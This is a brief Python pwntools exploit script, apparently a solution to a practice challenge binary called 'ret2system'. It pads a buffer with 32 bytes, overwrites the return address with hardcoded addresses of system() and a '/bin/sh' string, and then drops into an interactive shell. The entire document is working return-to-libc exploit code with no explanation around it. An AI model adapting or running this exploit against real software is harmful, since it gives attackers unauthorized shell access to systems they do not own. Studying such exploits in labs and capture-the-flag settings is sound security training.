from pwn import *

system = 0xf7e4f190
binsh = 0xf7f6fa24

s = process('./ret2system')

p = 'a' * 8 * 4
p += p32(system)
p += p32(0)
p += p32(binsh)

s.sendline(p)
s.interactive()
